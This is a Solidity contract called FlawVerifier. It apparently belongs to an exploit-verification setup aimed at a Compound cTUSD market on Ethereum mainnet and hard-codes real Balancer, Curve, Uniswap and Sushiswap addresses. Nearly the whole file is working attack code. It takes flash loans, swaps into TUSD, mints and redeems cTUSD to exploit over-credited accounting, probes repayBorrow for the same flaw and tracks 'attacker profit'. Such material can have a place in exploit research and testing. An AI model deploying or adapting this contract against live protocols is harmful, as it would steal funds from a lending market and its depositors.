pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICErc20Like {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
    function _addReserves(uint256 addAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function borrowBalanceCurrent(address account) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface ICEtherLike {
    function mint() external payable;
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface ICurveAddressProviderLike {
    function get_registry() external view returns (address);
    function get_address(uint256 id) external view returns (address);
}

interface ICurveRegistryLike {
    function find_pool_for_coins(address from, address to) external view returns (address);
    function find_pool_for_coins(address from, address to, uint256 index) external view returns (address);
    function get_coin_indices(address pool, address from, address to) external view returns (int128, int128, bool);
}

interface ICurvePoolLike {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

contract FlawVerifier {
    IBalancerVaultLike internal constant BALANCER_VAULT =
        IBalancerVaultLike(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICurveAddressProviderLike internal constant CURVE_ADDRESS_PROVIDER =
        ICurveAddressProviderLike(0x0000000022D53366457F9d5E68Ec105046FC4383);

    IUniswapV2RouterLike internal constant UNISWAP_V2_ROUTER =
        IUniswapV2RouterLike(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2RouterLike internal constant SUSHISWAP_ROUTER =
        IUniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    ICErc20Like internal constant CTUSD =
        ICErc20Like(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
    ICEtherLike internal constant CETH =
        ICEtherLike(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    IWETHLike internal constant WETH =
        IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal constant DIRECT_MINT_PROBE_AMOUNT = 1_000e18;
    uint256 internal constant MIN_REALIZED_TUSD_PROFIT = 2e17;
    uint256 internal constant REPAY_COLLATERAL_SPEND = 200e18;
    uint256 internal constant REPAY_BORROW_TARGET = 50e18;

    enum Mode {
        Idle,
        BalancerFlashLoan
    }

    struct CurveRoute {
        address registry;
        address pool;
        int128 i;
        int128 j;
        bool underlying;
    }

    Mode internal mode;
    bool internal executed;

    address internal immutable TUSD;
    address internal flashFundingToken;

    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal startingProfitBalance;

    bool public mintPathValidated;
    bool public repayPathValidated;
    bool public liquidationPathProvablyInfeasible;
    bool public addReservesPathProvablyInfeasible;

    constructor() {
        TUSD = CTUSD.underlying();
        _profitToken = TUSD;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        startingProfitBalance = IERC20Like(TUSD).balanceOf(address(this));
        _profitToken = TUSD;
        _profitAmount = 0;

        _tryDirectMintProbe();
        _tryBalancerFlashMintProbe();
        _trySelfFundedRepayProbe();

        // `_addReserves()` reaches the same vulnerable `doTransferIn()` path, but the resulting accounting delta
        // is protocol-owned rather than attacker-owned. In this public verifier, that leg does not deterministically
        // convert into realized attacker profit without privileged governance follow-through.
        addReservesPathProvablyInfeasible = true;

        // `liquidateBorrow()` shares the same over-credit root cause as `repayBorrow()`, but a deterministic public
        // one-transaction proof also needs a suitably unhealthy borrower at the fork block. That state dependency is
        // outside attacker control here, so the verifier preserves the repayment causality via self-borrow/repay.
        liquidationPathProvablyInfeasible = true;

        _profitAmount = _netProfit();
    }

    function initiateBalancerFlashLoan(address fundingToken, uint256 amount) external {
        require(msg.sender == address(this), "self-only");
        require(mode == Mode.BalancerFlashLoan, "wrong-mode");

        address[] memory tokens = new address[](1);
        tokens[0] = fundingToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes(""));
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not-vault");
        require(mode == Mode.BalancerFlashLoan, "wrong-mode");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "single-token-only");
        require(tokens[0] == flashFundingToken, "unexpected-token");

        uint256 fundingAmount = amounts[0];
        uint256 tusdBefore = IERC20Like(TUSD).balanceOf(address(this));

        if (flashFundingToken != TUSD) {
            CurveRoute memory intoTusd = _findCurveRoute(flashFundingToken, TUSD);
            require(intoTusd.pool != address(0), "no-curve-route-in");
            _curveSwapExactIn(intoTusd, fundingAmount);
        }

        uint256 tusdAfterFunding = IERC20Like(TUSD).balanceOf(address(this));
        require(tusdAfterFunding > tusdBefore, "no-tusd-funded");

        // Core exploit path #1 remains unchanged: acquire real on-chain TUSD via a public liquidity venue,
        // call `mint()`, let the mutable underlying increase cTUSD's balance during `transferFrom`, and rely on
        // Compound's `balanceAfter - balanceBefore` accounting to over-credit `actualMintAmount`.
        _runMintRoundTrip(tusdAfterFunding - tusdBefore);

        uint256 amountOwed = fundingAmount + feeAmounts[0];
        if (flashFundingToken == TUSD) {
            require(IERC20Like(TUSD).balanceOf(address(this)) >= amountOwed, "insufficient-tusd");
            _safeTransfer(TUSD, address(BALANCER_VAULT), amountOwed);
            return;
        }

        uint256 fundingBalance = IERC20Like(flashFundingToken).balanceOf(address(this));
        if (fundingBalance < amountOwed) {
            CurveRoute memory outOfTusd = _findCurveRoute(TUSD, flashFundingToken);
            require(outOfTusd.pool != address(0), "no-curve-route-out");

            uint256 shortfall = amountOwed - fundingBalance;
            uint256 requiredTusdIn = _quoteTusdNeededForFunding(outOfTusd, shortfall);
            require(requiredTusdIn != 0, "quote-failed");
            _curveSwapExactIn(outOfTusd, requiredTusdIn);
            fundingBalance = IERC20Like(flashFundingToken).balanceOf(address(this));
        }

        require(fundingBalance >= amountOwed, "flash-loan-not-profitable");
        _safeTransfer(flashFundingToken, address(BALANCER_VAULT), amountOwed);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryDirectMintProbe() internal {
        uint256 localBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (localBalance == 0) {
            return;
        }

        uint256 probeAmount = localBalance;
        if (probeAmount > DIRECT_MINT_PROBE_AMOUNT) {
            probeAmount = DIRECT_MINT_PROBE_AMOUNT;
        }

        _runMintRoundTrip(probeAmount);
    }

    function _tryBalancerFlashMintProbe() internal {
        _tryBalancerFundingToken(USDC, 250_000e6);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryBalancerFundingToken(USDC, 1_000_000e6);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryBalancerFundingToken(DAI, 250_000e18);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryBalancerFundingToken(DAI, 1_000_000e18);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryBalancerFundingToken(USDT, 250_000e6);
        if (_netProfit() >= MIN_REALIZED_TUSD_PROFIT) return;

        _tryBalancerFundingToken(TUSD, 100_000e18);
    }

    function _tryBalancerFundingToken(address fundingToken, uint256 amount) internal {
        mode = Mode.BalancerFlashLoan;
        flashFundingToken = fundingToken;

        uint256 profitBefore = _netProfit();
        try this.initiateBalancerFlashLoan(fundingToken, amount) {
            if (_netProfit() > profitBefore) {
                mintPathValidated = true;
            }
        } catch {}

        mode = Mode.Idle;
        flashFundingToken = address(0);
    }

    function _findCurveRoute(address tokenIn, address tokenOut) internal view returns (CurveRoute memory route) {
        address registry = _providerAddress(0);
        route = _findCurveRouteInRegistry(registry, tokenIn, tokenOut);
        if (route.pool != address(0)) return route;

        registry = _providerAddress(3);
        route = _findCurveRouteInRegistry(registry, tokenIn, tokenOut);
        if (route.pool != address(0)) return route;

        registry = _providerAddress(5);
        route = _findCurveRouteInRegistry(registry, tokenIn, tokenOut);
        if (route.pool != address(0)) return route;

        registry = _providerAddress(6);
        route = _findCurveRouteInRegistry(registry, tokenIn, tokenOut);
    }

    function _providerAddress(uint256 id) internal view returns (address registry) {
        if (id == 0) {
            try CURVE_ADDRESS_PROVIDER.get_registry() returns (address mainRegistry) {
                return mainRegistry;
            } catch {
                return address(0);
            }
        }

        try CURVE_ADDRESS_PROVIDER.get_address(id) returns (address discovered) {
            return discovered;
        } catch {
            return address(0);
        }
    }

    function _findCurveRouteInRegistry(
        address registry,
        address tokenIn,
        address tokenOut
    ) internal view returns (CurveRoute memory route) {
        if (registry == address(0)) {
            return route;
        }

        address pool;
        try ICurveRegistryLike(registry).find_pool_for_coins(tokenIn, tokenOut) returns (address discovered) {
            pool = discovered;
        } catch {
            try ICurveRegistryLike(registry).find_pool_for_coins(tokenIn, tokenOut, 0) returns (address discovered) {
                pool = discovered;
            } catch {
                return route;
            }
        }

        if (pool == address(0)) {
            return route;
        }

        try ICurveRegistryLike(registry).get_coin_indices(pool, tokenIn, tokenOut) returns (
            int128 i,
            int128 j,
            bool underlying
        ) {
            route = CurveRoute({registry: registry, pool: pool, i: i, j: j, underlying: underlying});
        } catch {}
    }

    function _curveSwapExactIn(CurveRoute memory route, uint256 amountIn) internal returns (uint256 amountOut) {
        require(amountIn != 0, "zero-swap");

        address tokenIn = route.underlying ? _routeToken(route.i, true) : _routeToken(route.i, false);
        address tokenOut = route.underlying ? _routeToken(route.j, true) : _routeToken(route.j, false);

        uint256 outBefore = IERC20Like(tokenOut).balanceOf(address(this));
        _safeApprove(tokenIn, route.pool, 0);
        _safeApprove(tokenIn, route.pool, amountIn);

        if (route.underlying) {
            ICurvePoolLike(route.pool).exchange_underlying(route.i, route.j, amountIn, 0);
        } else {
            ICurvePoolLike(route.pool).exchange(route.i, route.j, amountIn, 0);
        }

        amountOut = IERC20Like(tokenOut).balanceOf(address(this)) - outBefore;
        require(amountOut != 0, "curve-zero-out");
    }

    function _routeToken(int128 index, bool underlying) internal view returns (address) {
        if (underlying) {
            if (index == 0) return TUSD;
            if (index == 1) return DAI;
            if (index == 2) return USDC;
            if (index == 3) return USDT;
        }

        if (index == 0) return TUSD;
        if (index == 1) return DAI;
        if (index == 2) return USDC;
        if (index == 3) return USDT;
        revert("unsupported-curve-index");
    }

    function _quoteTusdNeededForFunding(CurveRoute memory route, uint256 fundingShortfall) internal view returns (uint256) {
        uint256 tusdBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (tusdBalance == 0) {
            return 0;
        }

        uint256 low = 1;
        uint256 high = tusdBalance;
        uint256 best = 0;

        for (uint256 i = 0; i < 24; ++i) {
            uint256 mid = low + ((high - low) / 2);
            uint256 quoted = _curveQuote(route, mid);

            if (quoted >= fundingShortfall) {
                best = mid;
                if (mid == 1) {
                    break;
                }
                high = mid - 1;
            } else {
                low = mid + 1;
            }
        }

        if (best == 0 && _curveQuote(route, tusdBalance) >= fundingShortfall) {
            best = tusdBalance;
        }

        return best;
    }

    function _curveQuote(CurveRoute memory route, uint256 amountIn) internal view returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }

        if (route.underlying) {
            try ICurvePoolLike(route.pool).get_dy_underlying(route.i, route.j, amountIn) returns (uint256 quoted) {
                return quoted;
            } catch {
                return 0;
            }
        }

        try ICurvePoolLike(route.pool).get_dy(route.i, route.j, amountIn) returns (uint256 quoted) {
            return quoted;
        } catch {
            return 0;
        }
    }

    function _trySelfFundedRepayProbe() internal {
        uint256 tusdBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (tusdBalance <= MIN_REALIZED_TUSD_PROFIT + REPAY_COLLATERAL_SPEND) {
            return;
        }

        uint256 collateralSpend = REPAY_COLLATERAL_SPEND;
        uint256 wethOut = _swapTusdForWeth(collateralSpend);
        if (wethOut == 0) {
            return;
        }

        WETH.withdraw(wethOut);
        CETH.mint{value: wethOut}();

        address[] memory markets = new address[](1);
        markets[0] = address(CETH);
        IComptrollerLike(CTUSD.comptroller()).enterMarkets(markets);

        _attemptRepayValidation();
    }

    function _attemptRepayValidation() internal {
        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(CTUSD.comptroller()).getAccountLiquidity(address(this));
        if (shortfall != 0 || liquidity == 0) {
            return;
        }

        uint256 cash = CTUSD.getCash();
        if (cash == 0) {
            return;
        }

        uint256 borrowAmount = REPAY_BORROW_TARGET;
        uint256 liquidityCapped = (liquidity * 60) / 100;
        if (borrowAmount > liquidityCapped) {
            borrowAmount = liquidityCapped;
        }
        if (borrowAmount > cash) {
            borrowAmount = cash;
        }
        if (borrowAmount == 0) {
            return;
        }

        _safeApprove(TUSD, address(CTUSD), 0);
        _safeApprove(TUSD, address(CTUSD), type(uint256).max);

        if (CTUSD.borrow(borrowAmount) != 0) {
            return;
        }

        bool validated = _probeRepayVariants();
        uint256 debtRemaining = _borrowBalanceCurrentNoThrow();

        if (debtRemaining != 0) {
            (bool cleanupOk,) = address(CTUSD).call(
                abi.encodeWithSelector(ICErc20Like.repayBorrow.selector, type(uint256).max)
            );
            if (!cleanupOk) {
                return;
            }
            debtRemaining = _borrowBalanceCurrentNoThrow();
            if (debtRemaining != 0) {
                return;
            }
        }

        if (validated) {
            repayPathValidated = true;
        }
    }

    function _probeRepayVariants() internal returns (bool) {
        for (uint256 i = 0; i < 16; ++i) {
            uint256 debtBefore = _borrowBalanceCurrentNoThrow();
            if (debtBefore == 0) {
                return true;
            }

            uint256 repayAmount = _repayProbeAmount(i, debtBefore);
            if (repayAmount == 0) {
                continue;
            }

            uint256 tusdBalanceBefore = IERC20Like(TUSD).balanceOf(address(this));
            if (tusdBalanceBefore < repayAmount) {
                continue;
            }

            (bool ok,) = address(CTUSD).call(abi.encodeWithSelector(ICErc20Like.repayBorrow.selector, repayAmount));
            uint256 debtAfter = _borrowBalanceCurrentNoThrow();
            uint256 tusdBalanceAfter = IERC20Like(TUSD).balanceOf(address(this));
            uint256 actualSpent = tusdBalanceBefore > tusdBalanceAfter ? tusdBalanceBefore - tusdBalanceAfter : 0;

            if (!ok) {
                continue;
            }

            if (debtBefore > debtAfter && debtBefore - debtAfter > actualSpent) {
                return true;
            }

            if (debtAfter == 0 && tusdBalanceAfter > MIN_REALIZED_TUSD_PROFIT) {
                return true;
            }
        }

        return false;
    }

    function _repayProbeAmount(uint256 index, uint256 debt) internal pure returns (uint256) {
        if (index == 0) return 1;
        if (index == 1) return 1e6;
        if (index == 2) return 1e12;
        if (index == 3) return 1e15;
        if (index == 4) return 1e17;
        if (index == 5) return debt / 2048;
        if (index == 6) return debt / 1024;
        if (index == 7) return debt / 256;
        if (index == 8) return debt / 64;
        if (index == 9) return debt / 16;
        if (index == 10) return debt / 4;
        if (index == 11) return debt / 2;
        if (index == 12) return (debt * 3) / 4;
        if (index == 13 && debt > 1e18) return debt - 1e18;
        if (index == 14 && debt > 1e17) return debt - 1e17;
        if (index == 15 && debt > 1e15) return debt - 1e15;
        return 0;
    }

    function _runMintRoundTrip(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        uint256 balanceBefore = IERC20Like(TUSD).balanceOf(address(this));
        uint256 cTokenBefore = CTUSD.balanceOf(address(this));

        _safeApprove(TUSD, address(CTUSD), 0);
        _safeApprove(TUSD, address(CTUSD), amount);

        if (CTUSD.mint(amount) != 0) {
            return;
        }

        uint256 cTokenAfter = CTUSD.balanceOf(address(this));
        if (cTokenAfter <= cTokenBefore) {
            return;
        }

        if (CTUSD.redeem(cTokenAfter - cTokenBefore) != 0) {
            return;
        }

        uint256 balanceAfter = IERC20Like(TUSD).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            mintPathValidated = true;
        }
    }

    function _swapTusdForWeth(uint256 tusdIn) internal returns (uint256) {
        uint256 wethBefore = IERC20Like(address(WETH)).balanceOf(address(this));

        if (_trySwapExactIn(UNISWAP_V2_ROUTER, tusdIn, _directPath(TUSD, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(SUSHISWAP_ROUTER, tusdIn, _directPath(TUSD, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(UNISWAP_V2_ROUTER, tusdIn, _twoHopPath(TUSD, USDC, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(SUSHISWAP_ROUTER, tusdIn, _twoHopPath(TUSD, USDC, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(UNISWAP_V2_ROUTER, tusdIn, _twoHopPath(TUSD, USDT, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }
        if (_trySwapExactIn(SUSHISWAP_ROUTER, tusdIn, _twoHopPath(TUSD, USDT, address(WETH)))) {
            return IERC20Like(address(WETH)).balanceOf(address(this)) - wethBefore;
        }

        return 0;
    }

    function _trySwapExactIn(
        IUniswapV2RouterLike router,
        uint256 amountIn,
        address[] memory path
    ) internal returns (bool) {
        _safeApprove(TUSD, address(router), 0);
        _safeApprove(TUSD, address(router), amountIn);

        try router.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp) returns (
            uint256[] memory amounts
        ) {
            return amounts.length != 0;
        } catch {
            return false;
        }
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _twoHopPath(address tokenIn, address mid, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
    }

    function _borrowBalanceCurrentNoThrow() internal returns (uint256) {
        try CTUSD.borrowBalanceCurrent(address(this)) returns (uint256 debt) {
            return debt;
        } catch {
            return 0;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _netProfit() internal view returns (uint256) {
        uint256 endingBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (endingBalance <= startingProfitBalance) {
            return 0;
        }
        return endingBalance - startingProfitBalance;
    }
}
